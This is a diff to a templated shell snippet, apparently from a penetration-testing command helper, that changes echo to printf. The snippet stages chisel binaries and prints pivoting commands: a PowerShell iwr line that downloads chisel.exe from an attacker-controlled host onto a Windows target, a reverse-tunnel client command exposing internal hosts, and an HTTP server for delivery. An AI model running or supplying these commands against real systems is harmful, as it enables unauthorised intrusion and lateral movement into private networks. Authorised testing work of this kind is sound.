@@ -8,18 +8,18 @@ metadata:
 content: |
   mkdir -p packstation/outbound; cp {{ tools_dir }}/chisel/chisel.exe packstation/outbound/chisel.exe; cp {{ tools_dir }}/chisel/chisel_linux_amd64 chisel; chmod +x chisel; \
 
-  echo "Answer the following with a target ip and port. Appropriate commands will be printed."; \
+  printf '%s\n' "Answer the following with a target ip and port. Appropriate commands will be printed."; \
   read --prompt-str "Target IP:" target; \
   read --prompt-str "Target port:" target_port; \
   read --prompt-str "Kali port:" kali_port; \
 
-  echo '================================================================'; \
-  echo '                      -----Kali-----                      '; \
-  echo 'Start reverse proxy: ./chisel server -p {{ proxy_port }} --reverse'; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/chisel.exe -Outfile {{ delivery_path_windows }}\chisel.exe'; \
-  echo "To run: {{ delivery_path_windows }}\chisel.exe client {{ attacker_ip }}:{{ proxy_port }} R:$kali_port:$target:$target_port"; \
-  echo "Expected Result: You should be able to reach $target:$target_$port on 127.0.0.1:$kali_port"; \
-  echo '================================================================'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -----Kali-----                      '; \
+  printf '%s\n' 'Start reverse proxy: ./chisel server -p {{ proxy_port }} --reverse'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -----PowerShell-----                      '; \
+  printf '%s\n' 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/chisel.exe -Outfile {{ delivery_path_windows }}\chisel.exe'; \
+  printf '%s\n' "To run: {{ delivery_path_windows }}\chisel.exe client {{ attacker_ip }}:{{ proxy_port }} R:$kali_port:$target:$target_port"; \
+  printf '%s\n' "Expected Result: You should be able to reach $target:$target_$port on 127.0.0.1:$kali_port"; \
+  printf '%s\n' '================================================================'; \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
